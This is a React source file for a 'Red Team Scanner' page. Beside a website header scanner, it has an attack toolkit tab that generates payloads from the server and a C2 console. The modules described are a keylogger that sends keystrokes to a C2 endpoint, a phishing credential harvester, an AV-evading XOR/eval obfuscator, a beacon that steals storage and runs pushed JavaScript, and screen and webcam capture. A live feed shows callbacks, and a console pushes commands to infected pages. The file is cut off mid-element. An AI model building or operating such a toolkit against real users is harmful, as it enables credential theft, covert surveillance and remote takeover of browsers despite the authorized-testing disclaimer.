// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
// Red Team Scanner — Twizted v1.0 technique analysis + actual attack toolkit
// Two modes: (1) Web Scanner — check your site's defenses
//            (2) Attack Toolkit — deploy real Trojan techniques for self-testing

import { useState, useEffect, useRef } from "react";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import {
  Target, Shield, ShieldAlert, ShieldCheck, AlertTriangle, Info,
  ChevronDown, ChevronRight, Loader2, Search, Copy, Download,
  CheckCircle, XCircle, Eye, Code2, Lock, Fingerprint,
  Globe, Key, Monitor, Wifi, Zap, RefreshCw, Trash2,
  Terminal, Radio, Bug, Server, Play, Send,
} from "lucide-react";
import { Button } from "@/components/ui/button";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
async function apiFetch(path: string, opts?: RequestInit) {
  const r = await fetch(`${BASE}/api${path}`, {
    credentials: "include", ...opts,
    headers: { "Content-Type": "application/json", ...(opts?.headers ?? {}) },
  });
  if (!r.ok) throw new Error(`HTTP ${r.status}`);
  return r.json();
}

// ─── Types ────────────────────────────────────────────────────────────────────

type Severity = "critical" | "high" | "medium" | "low" | "info";
interface Finding {
  technique: string; module: string; title: string; description: string;
  severity: Severity; evidence?: string; recommendation: string;
}
interface ScanResult {
  ok: boolean; url: string; redirectUrl?: string; status: number; scanTime: string;
  score: number; counts: Record<Severity, number>; modulesRun: string | string[];
  findings: Finding[]; headers: Record<string, string | null>; error?: string;
}

// ─── Scanner constants ────────────────────────────────────────────────────────

const SCAN_MODULES = [
  { id: "keylogger",   label: "Keylogger Detection",       color: "#ff4d4d", bas: "Keylog.bas" },
  { id: "credentials", label: "Credential Exposure",       color: "#ff8c00", bas: "Password.bas" },
  { id: "crypto",      label: "Weak Crypto",               color: "#ffd700", bas: "Crypt.bas" },
  { id: "c2",          label: "C2 Beacon Patterns",        color: "#ff4dff", bas: "CLIENT.BAS" },
  { id: "disclosure",  label: "Info Disclosure",           color: "#00bfff", bas: "Global.bas" },
  { id: "ui",          label: "UI / Clickjacking",         color: "#00ff88", bas: "disablectlaltdel.bas" },
  { id: "tracking",    label: "Fingerprinting",            color: "#7b68ee", bas: "Monitor.bas" },
  { id: "waf",         label: "WAF Fingerprint",           color: "#20b2aa", bas: "Firewall.bas" },
] as const;
type ModuleId = typeof SCAN_MODULES[number]["id"];

const SEV: Record<Severity, { label: string; color: string; bg: string; icon: React.ReactNode }> = {
  critical: { label: "Critical", color: "#ff2d2d", bg: "rgba(255,45,45,0.08)",   icon: <XCircle className="w-3.5 h-3.5" /> },
  high:     { label: "High",     color: "#ff8c00", bg: "rgba(255,140,0,0.08)",   icon: <AlertTriangle className="w-3.5 h-3.5" /> },
  medium:   { label: "Medium",   color: "#ffd700", bg: "rgba(255,215,0,0.08)",   icon: <ShieldAlert className="w-3.5 h-3.5" /> },
  low:      { label: "Low",      color: "#00bfff", bg: "rgba(0,191,255,0.08)",   icon: <Info className="w-3.5 h-3.5" /> },
  info:     { label: "Info",     color: "#888",    bg: "rgba(136,136,136,0.06)", icon: <Info className="w-3.5 h-3.5" /> },
};

// ─── Toolkit modules ──────────────────────────────────────────────────────────

const TOOLKIT_MODULES = [
  {
    id: "keylogger", bas: "Keylog.bas", label: "JavaScript Keylogger",
    color: "#ff4d4d", icon: <Key className="w-4 h-4" />,
    desc: "Captures all keystrokes, form field values, clipboard paste events, and full form submissions. Sends batched data to your C2 via sendBeacon. Equivalent of GetAsyncKeyState polling loop in the original VB6.",
    params: [
      { id: "flushInterval", label: "Flush interval (seconds)", type: "number", default: "15" },
      { id: "minKeys",       label: "Min keys before flush",    type: "number", default: "10" },
    ],
    endpoint: "/redteam-scan/toolkit/keylogger",
  },
  {
    id: "cred-harvester", bas: "Password.bas", label: "Credential Harvester",
    color: "#ff8c00", icon: <Lock className="w-4 h-4" />,
    desc: "Two modes: (1) Standalone HTML phishing page that captures username/password and sends to C2. (2) JS overlay injector — drops a full-screen 'session expired' modal over any existing page without leaving the original URL.",
    params: [
      { id: "targetBrand", label: "Brand / page title", type: "text", default: "Secure Login" },
      { id: "mode",        label: "Mode",               type: "select", options: ["page", "overlay"], default: "overlay" },
    ],
    endpoint: "/redteam-scan/toolkit/credential-harvester",
  },
  {
    id: "obfuscator", bas: "Crypt.bas", label: "XOR Payload Obfuscator",
    color: "#ffd700", icon: <Code2 className="w-4 h-4" />,
    desc: "XOR-encodes any JavaScript payload with a configurable key — identical technique to the Crypt.bas XOR cipher. Output is a self-decoding base64+eval stub that bypasses naive string-matching WAF/AV rules. Paste any payload below.",
    params: [
      { id: "payload", label: "Plaintext payload to obfuscate", type: "textarea", default: "alert('test')" },
      { id: "key",     label: "XOR key",                        type: "text", default: "TWIZTED" },
    ],
    endpoint: "/redteam-scan/toolkit/obfuscate",
  },
  {
    id: "c2-beacon", bas: "CLIENT.BAS", label: "C2 Beacon",
    color: "#ff4dff", icon: <Radio className="w-4 h-4" />,
    desc: "Self-contained JS beacon that polls your C2 every N seconds, sends session context (URL, user agent, localStorage keys, visible form values), and executes any JavaScript command returned. Direct port of CLIENT.BAS's main loop + remote command execution.",
    params: [
      { id: "intervalMs",    label: "Poll interval (ms)",    type: "number",   default: "5000" },
      { id: "stealStorage",  label: "Exfil storage keys",    type: "checkbox", default: "true" },
      { id: "stealCookies",  label: "Count cookies",         type: "checkbox", default: "true" },
    ],
    endpoint: "/redteam-scan/toolkit/c2-beacon",
  },
  {
    id: "port-scan", bas: "Firewall.bas", label: "TCP Port Scanner",
    color: "#20b2aa", icon: <Server className="w-4 h-4" />,
    desc: "Server-side TCP connect scan run from the ProxhqVPN API server. Tests which ports are open on your target host, returns banners where available, and maps to common service names. Firewall.bas equivalent — tests your firewall rule coverage.",
    params: [
      { id: "host",      label: "Target host / IP", type: "text",   default: "127.0.0.1" },
      { id: "portsText", label: "Ports (comma-separated or range e.g. 20-1024)", type: "text", default: "22,80,443,3306,5432,6379,8080,8443,3389,5900" },
      { id: "timeoutMs", label: "Timeout per port (ms)", type: "number", default: "1500" },
    ],
    endpoint: "/redteam-scan/toolkit/port-scan",
    noC2: true,
  },
  {
    id: "sysrecon", bas: "Global.bas", label: "System Recon (Browser)",
    color: "#00bfff", icon: <Fingerprint className="w-4 h-4" />,
    desc: "Single-shot browser payload: collects full navigator object, screen dimensions, GPU fingerprint (WebGL), installed fonts (canvas timing), battery status, network type, localStorage/sessionStorage key lists, timezone, installed plugins, and hardware info. Global.bas GetSystemInfo equivalent.",
    params: [],
    endpoint: "/redteam-scan/toolkit/sysrecon",
  },
  {
    id: "keyhijack", bas: "disablectlaltdel.bas", label: "Keyboard Hijack",
    color: "#00ff88", icon: <Terminal className="w-4 h-4" />,
    desc: "Blocks DevTools (F12, Ctrl+Shift+I/J/C), View Source (Ctrl+U), Save (Ctrl+S), Print (Ctrl+P), F5 refresh, right-click context menu, text selection, and drag events. Tests whether your system's security controls can detect or prevent a page from locking down browser access controls.",
    params: [
      { id: "blockDevTools",   label: "Block DevTools",    type: "checkbox", default: "true" },
      { id: "blockViewSource", label: "Block View Source", type: "checkbox", default: "true" },
      { id: "blockRightClick", label: "Block Right-click", type: "checkbox", default: "true" },
      { id: "blockCopyPaste",  label: "Block Copy/Paste",  type: "checkbox", default: "false" },
    ],
    endpoint: "/redteam-scan/toolkit/keyhijack",
  },
  {
    id: "screen-monitor", bas: "Monitor.bas", label: "Screen Monitor",
    color: "#7b68ee", icon: <Monitor className="w-4 h-4" />,
    desc: "Three sub-modes: (1) Canvas fingerprint — silent, no permissions, captures GPU rendering signature. (2) Screen capture — getDisplayMedia, prompts user to share screen (tests if users will grant access). (3) Webcam — getUserMedia, tests camera permission policy. Monitor.bas equivalent.",
    params: [
      { id: "mode",            label: "Mode",                  type: "select", options: ["canvas", "screen", "webcam"], default: "canvas" },
      { id: "captureInterval", label: "Capture interval (s)",  type: "number", default: "30" },
    ],
    endpoint: "/redteam-scan/toolkit/screen-monitor",
  },
] as const;

// ─── Shared helpers ───────────────────────────────────────────────────────────

function copyText(text: string) {
  navigator.clipboard.writeText(text).catch(() => {
    const el = document.createElement("textarea");
    el.value = text; document.body.appendChild(el); el.select();
    document.execCommand("copy"); document.body.removeChild(el);
  });
}

function SevBadge({ sev }: { sev: Severity }) {
  const c = SEV[sev];
  return <span className="text-[9px] font-bold uppercase px-1.5 py-0.5 rounded-sm" style={{ color: c.color, border: `1px solid ${c.color}40`, background: c.bg }}>{c.label}</span>;
}

function ScoreGauge({ score }: { score: number }) {
  const color = score >= 80 ? "#00ff88" : score >= 60 ? "#ffd700" : score >= 40 ? "#ff8c00" : "#ff2d2d";
  const label = score >= 80 ? "Good" : score >= 60 ? "Fair" : score >= 40 ? "Poor" : "Critical";
  const r = 40; const circ = 2 * Math.PI * r; const offset = circ - (score / 100) * circ;
  return (
    <div className="flex flex-col items-center">
      <svg width="100" height="100" viewBox="0 0 100 100" className="-rotate-90">
        <circle cx="50" cy="50" r={r} fill="none" stroke="rgba(255,255,255,0.05)" strokeWidth="10" />
        <circle cx="50" cy="50" r={r} fill="none" stroke={color} strokeWidth="10" strokeDasharray={circ} strokeDashoffset={offset} strokeLinecap="round" style={{ transition: "stroke-dashoffset 1s ease" }} />
      </svg>
      <div className="text-center -mt-16">
        <div className="text-2xl font-bold font-mono" style={{ color }}>{score}</div>
        <div className="text-[9px] uppercase tracking-widest" style={{ color }}>{label}</div>
      </div>
    </div>
  );
}

function FindingCard({ f }: { f: Finding }) {
  const [open, setOpen] = useState(false);
  const c = SEV[f.severity];
  return (
    <div className="border rounded-sm overflow-hidden" style={{ borderColor: `${c.color}30` }}>
      <button onClick={() => setOpen(o => !o)} className="w-full flex items-start gap-2.5 px-3 py-2.5 text-left hover:opacity-90" style={{ background: c.bg }}>
        <span className="mt-0.5 shrink-0" style={{ color: c.color }}>{c.icon}</span>
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-[11px] font-semibold text-primary/90">{f.title}</span>
            <SevBadge sev={f.severity} />
            <span className="text-[9px] text-primary/25 font-mono ml-auto shrink-0">{f.module}</span>
          </div>
          <div className="text-[9px] text-primary/30 mt-0.5 font-mono truncate">{f.technique}</div>
        </div>
        {open ? <ChevronDown className="w-3 h-3 text-primary/30 mt-1 shrink-0" /> : <ChevronRight className="w-3 h-3 text-primary/30 mt-1 shrink-0" />}
      </button>
      {open && (
        <div className="px-3 pb-3 pt-2 space-y-2 border-t" style={{ borderColor: `${c.color}20` }}>
          <p className="text-[11px] text-primary/70 leading-relaxed">{f.description}</p>
          {f.evidence && <div className="flex items-start gap-2"><span className="text-[9px] font-bold uppercase text-primary/25 mt-0.5 shrink-0">Evidence</span><code className="text-[10px] text-orange-400/70 break-all font-mono leading-relaxed">{f.evidence}</code></div>}
          <div className="flex items-start gap-2 p-2 bg-[#00ff88]/5 border border-[#00ff88]/15 rounded-sm">
            <ShieldCheck className="w-3 h-3 text-[#00ff88]/60 mt-0.5 shrink-0" />
            <p className="text-[10px] text-[#00ff88]/70 leading-relaxed">{f.recommendation}</p>
          </div>
        </div>
      )}
    </div>
  );
}

// ─── Scanner Tab ──────────────────────────────────────────────────────────────

function ScannerTab() {
  const [url, setUrl] = useState("");
  const [mods, setMods] = useState<Set<ModuleId>>(new Set(SCAN_MODULES.map(m => m.id)));
  const [result, setResult] = useState<ScanResult | null>(null);
  const [activeSev, setActiveSev] = useState<Severity | "all">("all");

  const scanMut = useMutation({
    mutationFn: () => apiFetch("/redteam-scan/scan", {
      method: "POST",
      body: JSON.stringify({
        url: url.trim().startsWith("http") ? url.trim() : `https://${url.trim()}`,
        modules: mods.size === SCAN_MODULES.length ? [] : Array.from(mods),
      }),
    }),
    onSuccess: (d: any) => setResult(d),
    onError: (e: Error) => setResult({ ok: false, url, status: 0, scanTime: new Date().toISOString(), score: 0, counts: { critical: 0, high: 0, medium: 0, low: 0, info: 0 }, modulesRun: [], findings: [], headers: {}, error: e.message }),
  });

  const filtered = result?.findings.filter(f => activeSev === "all" || f.severity === activeSev) ?? [];

  return (
    <div className="space-y-4">
      {/* URL + modules */}
      <div className="space-y-2">
        <div className="flex gap-2">
          <div className="flex-1 relative">
            <Globe className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-primary/20" />
            <input value={url} onChange={e => setUrl(e.target.value)}
              onKeyDown={e => e.key === "Enter" && url && !scanMut.isPending && scanMut.mutate()}
              placeholder="https://yourdomain.com"
              className="w-full bg-black/40 border border-primary/20 text-primary text-sm font-mono pl-8 pr-3 py-2 focus:outline-none focus:border-red-400/40 placeholder:text-primary/15 rounded-sm" />
          </div>
          <Button onClick={() => scanMut.mutate()} disabled={!url.trim() || scanMut.isPending}
            className="bg-red-500/15 border border-red-500/40 text-red-400 hover:bg-red-500/25 text-xs px-5 h-10 rounded-sm">
            {scanMut.isPending ? <><Loader2 className="w-3.5 h-3.5 animate-spin mr-2" />Scanning…</> : <><Search className="w-3.5 h-3.5 mr-2" />Scan</>}
          </Button>
        </div>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-1.5">
          {SCAN_MODULES.map(m => {
            const active = mods.has(m.id);
            return (
              <button key={m.id} onClick={() => setMods(prev => { const n = new Set(prev); n.has(m.id) ? n.delete(m.id) : n.add(m.id); return n; })}
                className="flex items-center gap-1.5 px-2 py-1.5 text-[9px] font-semibold rounded-sm border transition-all text-left"
                style={active ? { borderColor: `${m.color}40`, background: `${m.color}10`, color: m.color } : { borderColor: "rgba(255,255,255,0.06)", color: "rgba(255,255,255,0.2)" }}>
                <span className="font-mono">{m.bas}</span>
              </button>
            );
          })}
        </div>
      </div>

      {/* Results */}
      {result && (
        <div className="space-y-4">
          <div className="border border-primary/10 rounded-sm p-4">
            <div className="flex items-start gap-6 flex-wrap">
              <ScoreGauge score={result.score} />
              <div className="flex-1 space-y-2 min-w-0">
                <div className="text-xs font-mono text-primary/60 break-all">{result.url}</div>
                {result.redirectUrl && <div className="text-[9px] text-primary/25">→ {result.redirectUrl}</div>}
                <div className="text-[9px] text-primary/30">HTTP {result.status} · {new Date(result.scanTime).toLocaleString()}</div>
                <div className="flex flex-wrap gap-2 mt-2">
                  {(["critical", "high", "medium", "low", "info"] as Severity[]).map(s => (
                    <button key={s} onClick={() => setActiveSev(p => p === s ? "all" : s)}
                      className={`flex items-center gap-1 px-2 py-1 rounded-sm border text-[10px] font-bold transition-all ${activeSev === s ? "opacity-100" : "opacity-50 hover:opacity-75"}`}
                      style={{ borderColor: `${SEV[s].color}40`, color: SEV[s].color, background: activeSev === s ? SEV[s].bg : "transparent" }}>
                      {SEV[s].icon}<span>{result.counts[s]}</span><span className="font-normal text-[9px]">{SEV[s].label}</span>
                    </button>
                  ))}
                  <button onClick={() => setActiveSev("all")} className={`px-2 py-1 rounded-sm border text-[9px] border-primary/15 text-primary/30 ${activeSev === "all" ? "bg-primary/5" : ""}`}>All ({result.findings.length})</button>
                  <button onClick={() => { const b = new Blob([JSON.stringify(result, null, 2)], { type: "application/json" }); const a = document.createElement("a"); a.href = URL.createObjectURL(b); a.download = `scan-${Date.now()}.json`; a.click(); }}
                    className="ml-auto flex items-center gap-1 text-[9px] text-primary/25 hover:text-primary/50 px-2 border border-primary/10 rounded-sm">
                    <Download className="w-3 h-3" />JSON
                  </button>
                </div>
              </div>
            </div>
          </div>

          {/* Security headers grid */}
          {Object.keys(result.headers).length > 0 && (
            <div>
              <div className="text-[9px] font-bold uppercase tracking-widest text-primary/25 mb-2">Security Headers</div>
              <div className="grid grid-cols-2 gap-1.5">
                {[["csp","CSP"],["hsts","HSTS"],["xfo","X-Frame-Options"],["xcto","X-Content-Type"],["cors","CORS"],["xpb","X-Powered-By"],["server","Server Banner"]].map(([key, label]) => {
                  const val = result.headers[key];
                  const good = key === "xpb" ? !val : key === "server" ? (!val || /^(nginx|apache|caddy|cloudflare)$/i.test(val)) : !!val;
                  return (
                    <div key={key} className="flex items-center justify-between px-2 py-1.5 border border-primary/10 rounded-sm">
                      <span className="text-[10px] text-primary/50">{label}</span>
                      <div className="flex items-center gap-1">
                        {good ? <CheckCircle className="w-3 h-3 text-[#00ff88]" /> : <XCircle className="w-3 h-3 text-red-400" />}
                        <span className="text-[9px] font-mono text-primary/30 max-w-[80px] truncate" title={val ?? "—"}>{val?.substring(0, 20) ?? "—"}</span>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {filtered.length > 0 && (
            <div className="space-y-2">
              <div className="text-[9px] font-bold uppercase tracking-widest text-primary/25 mb-2">Findings ({filtered.length})</div>
              {filtered.map((f, i) => <FindingCard key={i} f={f} />)}
            </div>
          )}
          {result.findings.length === 0 && result.ok && (
            <div className="text-center py-10 border border-[#00ff88]/10 rounded-sm">
              <ShieldCheck className="w-8 h-8 text-[#00ff88]/30 mx-auto mb-2" />
              <div className="text-sm text-[#00ff88]/50">No issues detected — score {result.score}/100</div>
            </div>
          )}
        </div>
      )}

      {!result && !scanMut.isPending && (
        <div className="border border-primary/8 rounded-sm p-8 text-center">
          <Target className="w-10 h-10 text-red-400/15 mx-auto mb-3" />
          <div className="text-xs text-primary/20">Enter a URL and click Scan to check your defenses</div>
        </div>
      )}
    </div>
  );
}

// ─── Toolkit Module Card ──────────────────────────────────────────────────────

function ModuleCard({ mod, sid, c2Url }: { mod: typeof TOOLKIT_MODULES[number]; sid: string; c2Url: string }) {
  const [params, setParams] = useState<Record<string, string>>(() => {
    const p: Record<string, string> = { callbackUrl: c2Url };
    if ("params" in mod) {
      (mod.params as readonly { id: string; default: string }[]).forEach(pm => { p[pm.id] = pm.default; });
    }
    return p;
  });
  const [result, setResult] = useState<any>(null);
  const [copied, setCopied] = useState(false);
  const [open, setOpen] = useState(false);

  const genMut = useMutation({
    mutationFn: () => {
      // Port scanner: parse ports text → array
      const body: Record<string, any> = { sid, ...params };
      if (mod.id === "port-scan") {
        const pt = String(params.portsText || "");
        const ports: number[] = [];
        pt.split(",").forEach(part => {
          const rng = part.trim().split("-");
          if (rng.length === 2) { for (let p = Number(rng[0]); p <= Math.min(Number(rng[1]), 65535); p++) ports.push(p); }
          else if (rng[0]) ports.push(Number(rng[0]));
        });
        body.ports = ports.slice(0, 500);
        delete body.portsText;
      }
      return apiFetch(mod.endpoint, { method: "POST", body: JSON.stringify(body) });
    },
    onSuccess: (d: any) => setResult(d),
  });

  const handleCopy = () => {
    if (result?.payload) { copyText(result.payload); setCopied(true); setTimeout(() => setCopied(false), 2000); }
  };
  const handleDl = () => {
    if (!result?.payload) return;
    const ext = result.language === "html" ? "html" : "js";
    const b = new Blob([result.payload], { type: "text/plain" });
    const a = document.createElement("a"); a.href = URL.createObjectURL(b); a.download = `${mod.id}.${ext}`; a.click();
  };

  return (
    <div className="border border-primary/10 rounded-sm overflow-hidden">
      <button onClick={() => setOpen(o => !o)} className="w-full flex items-start gap-3 px-4 py-3 text-left hover:bg-white/[0.02] transition-colors">
        <span className="mt-0.5 shrink-0" style={{ color: mod.color }}>{mod.icon}</span>
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-[11px] font-bold text-primary/90">{mod.label}</span>
            <span className="text-[9px] font-mono border px-1.5 py-0.5 rounded-sm" style={{ color: mod.color, borderColor: `${mod.color}30` }}>{mod.bas}</span>
            {result && <span className="text-[9px] text-[#00ff88]/60 ml-auto">✓ generated</span>}
          </div>
          <p className="text-[10px] text-primary/35 mt-0.5 leading-relaxed line-clamp-2">{mod.desc}</p>
        </div>
        {open ? <ChevronDown className="w-3.5 h-3.5 text-primary/30 mt-0.5 shrink-0" /> : <ChevronRight className="w-3.5 h-3.5 text-primary/30 mt-0.5 shrink-0" />}
      </button>

      {open && (
        <div className="px-4 pb-4 border-t border-primary/8 pt-3 space-y-3">
          <p className="text-[10px] text-primary/50 leading-relaxed">{mod.desc}</p>

          {/* Params */}
          {"params" in mod && (mod.params as readonly any[]).length > 0 && (
            <div className="grid grid-cols-2 gap-2">
              {(mod.params as readonly any[]).map((pm: any) => (
                <div key={pm.id}>
                  <label className="text-[9px] text-primary/30 block mb-1">{pm.label}</label>
                  {pm.type === "textarea" ? (
                    <textarea value={params[pm.id] ?? pm.default} onChange={e => setParams(p => ({ ...p, [pm.id]: e.target.value }))}
                      rows={3} className="w-full bg-black/40 border border-primary/15 text-primary/70 text-[10px] font-mono px-2 py-1.5 rounded-sm focus:outline-none focus:border-primary/30 resize-none col-span-2" />
                  ) : pm.type === "checkbox" ? (
                    <label className="flex items-center gap-2 cursor-pointer">
                      <input type="checkbox" checked={params[pm.id] !== "false"} onChange={e => setParams(p => ({ ...p, [pm.id]: String(e.target.checked) }))} className="accent-primary" />
                      <span className="text-[9px] text-primary/40">{params[pm.id] !== "false" ? "enabled" : "disabled"}</span>
                    </label>
                  ) : pm.type === "select" ? (
                    <select value={params[pm.id] ?? pm.default} onChange={e => setParams(p => ({ ...p, [pm.id]: e.target.value }))}
                      className="w-full bg-black/60 border border-primary/15 text-primary/70 text-[10px] px-2 py-1.5 rounded-sm focus:outline-none">
                      {(pm.options as string[]).map((o: string) => <option key={o} value={o}>{o}</option>)}
                    </select>
                  ) : (
                    <input type={pm.type} value={params[pm.id] ?? pm.default} onChange={e => setParams(p => ({ ...p, [pm.id]: e.target.value }))}
                      className="w-full bg-black/40 border border-primary/15 text-primary/70 text-[10px] font-mono px-2 py-1.5 rounded-sm focus:outline-none focus:border-primary/30" />
                  )}
                </div>
              ))}
            </div>
          )}

          {/* C2 URL field (always shown unless noC2) */}
          {"noC2" in mod ? null : (
            <div>
              <label className="text-[9px] text-primary/30 block mb-1">Callback URL (auto-set to your C2)</label>
              <input value={params.callbackUrl || c2Url} onChange={e => setParams(p => ({ ...p, callbackUrl: e.target.value }))}
                className="w-full bg-black/40 border border-primary/15 text-primary/50 text-[10px] font-mono px-2 py-1.5 rounded-sm focus:outline-none focus:border-primary/30" />
            </div>
          )}

          <Button onClick={() => genMut.mutate()} disabled={genMut.isPending}
            className="text-xs rounded-sm border h-8 px-4"
            style={{ background: `${mod.color}15`, borderColor: `${mod.color}40`, color: mod.color }}>
            {genMut.isPending ? <Loader2 className="w-3 h-3 animate-spin mr-1.5" /> : <Play className="w-3 h-3 mr-1.5" />}
            {("noC2" in mod) ? "Run Scan" : "Generate Payload"}
          </Button>

          {/* Results */}
          {result && (
            <div className="space-y-2">
              {/* Port scanner results */}
              {mod.id === "port-scan" && result.open && (
                <div className="space-y-1">
                  <div className="text-[9px] font-bold uppercase tracking-widest text-primary/25">{result.scanned} ports scanned · {result.open.length} open</div>
                  {result.open.length === 0 ? (
                    <div className="text-[10px] text-primary/30 py-2">All ports closed or filtered</div>
                  ) : (
                    <div className="grid grid-cols-2 gap-1">
                      {result.open.map((p: any) => (
                        <div key={p.port} className="flex items-center gap-2 px-2 py-1 border border-[#00ff88]/15 rounded-sm bg-[#00ff88]/5">
                          <span className="text-[10px] font-mono font-bold text-[#00ff88]">{p.port}</span>
                          <span className="text-[9px] text-primary/40">{p.service}</span>
                          {p.banner && <span className="text-[8px] text-primary/25 truncate">{p.banner}</span>}
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}

              {/* Payload output */}
              {result.payload && (
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <div className="text-[9px] text-primary/25 uppercase tracking-widest">{result.language === "html" ? "HTML Payload" : "JavaScript Payload"} · {result.deployHint}</div>
                    <div className="flex gap-1">
                      <button onClick={handleCopy} className="flex items-center gap-1 text-[9px] text-primary/30 hover:text-primary/60 px-2 py-1 border border-primary/10 rounded-sm">
                        {copied ? <CheckCircle className="w-3 h-3 text-[#00ff88]" /> : <Copy className="w-3 h-3" />}{copied ? "Copied" : "Copy"}
                      </button>
                      <button onClick={handleDl} className="flex items-center gap-1 text-[9px] text-primary/30 hover:text-primary/60 px-2 py-1 border border-primary/10 rounded-sm">
                        <Download className="w-3 h-3" />Download
                      </button>
                    </div>
                  </div>
                  <pre className="bg-black/60 border border-primary/10 rounded-sm p-3 text-[9px] font-mono text-green-400/70 overflow-x-auto max-h-48 leading-relaxed whitespace-pre-wrap break-all">{result.payload}</pre>
                </div>
              )}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ─── Attack Toolkit Tab ───────────────────────────────────────────────────────

function AttackToolkitTab() {
  const qc = useQueryClient();
  // Session ID persisted for this browser session
  const [sid] = useState(() => {
    const stored = sessionStorage.getItem("redteam-sid");
    if (stored) return stored;
    const newSid = Math.random().toString(36).substring(2, 11);
    sessionStorage.setItem("redteam-sid", newSid);
    return newSid;
  });

  const origin = typeof window !== "undefined" ? window.location.origin : "";
  const c2Url = `${origin}${BASE}/api/redteam-scan/c2/ingest`;

  const [cmdCode, setCmdCode] = useState("document.title");
  const [polling, setPolling] = useState(false);

  const eventsQ = useQuery({
    queryKey: ["c2-events", sid],
    queryFn: () => apiFetch(`/redteam-scan/c2/events?sid=${sid}`),
    enabled: polling,
    refetchInterval: polling ? 3000 : false,
  });

  const clearMut = useMutation({
    mutationFn: () => apiFetch(`/redteam-scan/c2/events?sid=${sid}`, { method: "DELETE" }),
    onSuccess: () => qc.invalidateQueries({ queryKey: ["c2-events", sid] }),
  });

  const cmdMut = useMutation({
    mutationFn: () => apiFetch("/redteam-scan/c2/cmd", { method: "POST", body: JSON.stringify({ sid, code: cmdCode }) }),
  });

  const events: any[] = (eventsQ.data as any)?.events ?? [];

  return (
    <div className="grid lg:grid-cols-[1fr_300px] gap-5">
      {/* Left: Modules */}
      <div className="space-y-3">
        {/* Session info */}
        <div className="border border-primary/10 rounded-sm p-3 flex flex-wrap items-start gap-3">
          <div className="flex-1 min-w-0">
            <div className="text-[9px] font-bold uppercase tracking-widest text-primary/25 mb-1">C2 Session ID</div>
            <code className="text-[10px] font-mono text-[#00ff88]/70">{sid}</code>
          </div>
          <div className="flex-1 min-w-0">
            <div className="text-[9px] font-bold uppercase tracking-widest text-primary/25 mb-1">Ingest Endpoint (public)</div>
            <div className="flex items-center gap-1.5">
              <code className="text-[9px] font-mono text-primary/40 truncate">{c2Url}</code>
              <button onClick={() => copyText(c2Url)} className="shrink-0 text-primary/30 hover:text-primary/60"><Copy className="w-3 h-3" /></button>
            </div>
          </div>
          <div className="text-[9px] text-primary/20 leading-relaxed max-w-xs">
            All generated payloads are pre-configured to this C2 URL. Payloads you deploy on your test systems will send callbacks here, visible in the live feed →
          </div>
        </div>

        {/* Disclaimer */}
        <div className="flex items-start gap-2 px-3 py-2 border border-red-500/15 bg-red-500/5 rounded-sm">
          <Shield className="w-3.5 h-3.5 text-red-400/50 mt-0.5 shrink-0" />
          <p className="text-[9px] text-red-400/50 leading-relaxed">
            For authorized security testing only — deploy against systems you own or have written permission to test. All callbacks are received server-side from the ProxhqVPN API, not the user's browser.
          </p>
        </div>

        {/* Module cards */}
        <div className="space-y-2">
          {TOOLKIT_MODULES.map(mod => (
            <ModuleCard key={mod.id} mod={mod as any} sid={sid} c2Url={c2Url} />
          ))}
        </div>
      </div>

      {/* Right: C2 Live Feed */}
      <div className="space-y-3">
        <div className="border border-primary/10 rounded-sm overflow-hidden">
          <div className="flex items-center justify-between px-3 py-2 border-b border-primary/10">
            <div className="flex items-center gap-2">
              <Radio className={`w-3.5 h-3.5 ${polling ? "text-[#00ff88] animate-pulse" : "text-primary/25"}`} />
              <span className="text-[9px] font-bold uppercase tracking-widest text-primary/40">C2 Live Feed</span>
              {events.length > 0 && <span className="text-[9px] bg-[#00ff88]/10 text-[#00ff88]/70 border border-[#00ff88]/20 rounded-full px-1.5">{events.length}</span>}
            </div>
            <div className="flex items-center gap-1">
              <button onClick={() => setPolling(p => !p)}
                className={`text-[9px] px-2 py-1 rounded-sm border transition-all ${polling ? "border-[#00ff88]/30 text-[#00ff88]/70 bg-[#00ff88]/10" : "border-primary/15 text-primary/30"}`}>
                {polling ? "Stop" : "Start"}
              </button>
              <button onClick={() => qc.invalidateQueries({ queryKey: ["c2-events", sid] })} className="text-primary/25 hover:text-primary/50 p-1">
                <RefreshCw className="w-3 h-3" />
              </button>
              <button onClick={() => clearMut.mutate()} className="text-primary/25 hover:text-red-400/50 p-1" title="Clear events">
                <Trash2 className="w-3 h-3" />
              </button>
            </div>
          </div>

          <div className="max-h-64 overflow-y-auto">
            {events.length === 0 ? (
              <div className="px-3 py-6 text-center text-[9px] text-primary/15">
                {polling ? "Waiting for callbacks…" : "Start polling to receive callbacks"}
              </div>
            ) : (
              <div className="divide-y divide-primary/8">
                {events.map((ev: any, i: number) => (
                  <div key={i} className="px-3 py-2">
                    <div className="flex items-center justify-between mb-0.5">
                      <span className="text-[9px] font-bold text-[#00ff88]/70">{ev.type}</span>
                      <span className="text-[8px] text-primary/20 font-mono">{new Date(ev.ts).toLocaleTimeString()}</span>
                    </div>
                    <div className="text-[8px] text-primary/30 font-mono">{ev.ip}</div>
                    <pre className="text-[8px] text-primary/40 font-mono mt-0.5 max-h-16 overflow-hidden leading-relaxed whitespace-pre-wrap break-all">{JSON.stringify(ev.data, null, 1).slice(0, 300)}</pre>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>

        {/* Command console */}
        <div className="border border-primary/10 rounded-sm overflow-hidden">
          <div className="px-3 py-2 border-b border-primary/10 flex items-center gap-2">
            <Terminal className="w-3 h-3 text-primary/25" />
            <span className="text-[9px] font-bold uppercase tracking-widest text-primary/40">Command Console</span>
          </div>
          <div className="p-3 space-y-2">
            <div className="text-[8px] text-primary/20 leading-relaxed">Push JavaScript to execute on next C2 beacon poll from session <code className="text-[#00ff88]/40">{sid}</code></div>
            <textarea value={cmdCode} onChange={e => setCmdCode(e.target.value)} rows={4}
